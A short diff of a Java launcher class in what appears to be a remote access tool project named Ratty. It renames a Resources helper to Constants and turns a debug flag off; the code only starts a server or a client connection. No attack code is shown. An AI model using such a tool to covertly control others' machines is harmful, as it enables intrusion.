@@ -1,17 +1,17 @@
 package de.sogomn.rat;
 
-import static de.sogomn.rat.util.Resources.LANGUAGE;
+import static de.sogomn.rat.util.Constants.LANGUAGE;
 
 import javax.swing.JOptionPane;
 
 import de.sogomn.rat.gui.server.RattyGui;
 import de.sogomn.rat.gui.server.RattyGuiController;
 import de.sogomn.rat.server.ActiveServer;
-import de.sogomn.rat.util.Resources;
+import de.sogomn.rat.util.Constants;
 
 public final class Server {
 	
-	private static final boolean DEBUG = true;
+	private static final boolean DEBUG = false;
 	
 	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
 	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
@@ -30,17 +30,17 @@ public final class Server {
 		if (input == JOptionPane.YES_OPTION) {
 			System.out.println(DEBUG_SERVER);
 			
-			Resources.setNimbusLookAndFeel();
-			startServer(Resources.PORT);
+			Constants.setNimbusLookAndFeel();
+			startServer(Constants.PORT);
 		} else if (input == JOptionPane.NO_OPTION) {
 			System.out.println(DEBUG_CLIENT);
 			
-			Client.startClient(Resources.ADDRESS, Resources.PORT);
+			Client.startClient(Constants.ADDRESS, Constants.PORT);
 		}
 	}
 	
 	private static void startServer() {
-		Resources.setNimbusLookAndFeel();
+		Constants.setNimbusLookAndFeel();
 		
 		final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
 		
